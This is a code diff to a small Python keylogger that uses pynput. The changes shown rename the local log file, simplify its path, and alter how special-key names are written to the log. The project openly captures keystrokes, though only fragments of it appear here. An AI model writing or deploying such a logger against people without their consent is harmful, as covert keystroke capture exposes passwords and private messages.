@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
 
-filename = "log.txt"
-path = "D:\\Projects\\Python-keylogger"
+filename = "the_keylogger_i_made_log.txt"
+path = ".\\"
 extension = "\\"
 
 count = 0
@@ -21,7 +21,8 @@ def on_press(key):
 
 
 def write_file(keys):
-    with open(path + extension + filename, "a") as f:
+    fullpath = path + filename
+    with open(fullpath, "a") as f:
         for key in keys:
             # get rid of annoying single quotes
             k = str(key).replace("'", "")
@@ -36,7 +37,7 @@ def write_file(keys):
                 f.close()
 
             else:
-                f.write(k.replace("Key.", ""))
+                f.write(k.replace("Key.", "\n"))
                 f.close()
 
 
